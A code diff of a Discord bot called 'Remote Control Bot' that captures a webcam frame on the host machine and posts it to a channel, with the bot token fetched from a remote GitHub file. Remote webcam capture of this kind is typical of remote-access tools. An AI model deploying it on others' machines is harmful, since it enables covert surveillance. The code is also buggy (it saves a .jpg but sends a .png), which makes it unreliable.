@@ -216,27 +216,25 @@ async def take_picture(interaction : Interaction):
         await interaction.response.send_message("Taking picture...")
         cap = cv2.VideoCapture(0)
         if not cap.isOpened():
-            print("Could not open webcam.")
-            exit()
-        ret, frame = cap.read()
-        if not ret:
-            print("Failed to grab frame.")
-            cap.release()
-            exit()
-        if cap == None:
             await interaction.edit_original_message("No camera found, failed to take picture.")
         else:
-            cv2.imwrite('captured_image.jpg', frame)
-            cap.release()
+            ret, frame = cap.read()
+            if not ret:
+                await interaction.edit_original_message("Failed to grab frame.")
+                cap.release()
+                exit()
+            else:
+                cv2.imwrite('captured_image.jpg', frame)
+                cap.release()
 
-            file = nextcord.File(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'captured_image.png'), filename='captured_image.png')
-            embed = nextcord.Embed(description="Image", title="Captured image:", timestamp=datetime.now(), colour=0xb400f5)
-            embed.set_author(name="Remote Control Bot")
-            embed.set_image(url=f"attachment://status.png")
-            embed.set_footer(text="Remote Control Bot v1.3")
+                file = nextcord.File(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'captured_image.png'), filename='captured_image.png')
+                embed = nextcord.Embed(description="Image", title="Captured image:", timestamp=datetime.now(), colour=0xb400f5)
+                embed.set_author(name="Remote Control Bot")
+                embed.set_image(url=f"attachment://status.png")
+                embed.set_footer(text="Remote Control Bot v1.3")
 
-            await interaction.send(embed=embed, file=file)
-            await interaction.delete_original_message()
+                await interaction.send(embed=embed, file=file)
+                await interaction.delete_original_message()
 
 r = requests.get("https://raw.githubusercontent.com/noel-create/skibidi/refs/heads/main/tok")
 token = r.text
